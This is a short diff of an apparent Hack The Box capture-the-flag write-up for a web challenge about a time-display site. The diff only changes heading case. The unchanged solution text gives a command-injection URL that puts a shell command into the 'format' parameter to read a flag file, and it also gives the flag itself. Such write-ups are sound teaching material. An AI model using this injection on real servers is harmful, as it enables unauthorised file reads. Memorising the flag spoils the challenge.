@@ -3,11 +3,11 @@
 - attachments
   - [`web_timekorp.zip`](web_timekorp.zip)
 
-## Solution
+## solution
 
 Go to `http://94.237.55.185:45222/?format=%27;%20echo%20$(cat%20../flag)%20%27` in your browser, replacing the hostname with your own one. The flag will be shown clearly on the webpage. The flag is `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`.
 
-## Process
+## process
 
 If you look at the webpage, it seems to be a website displaying the current time.
 
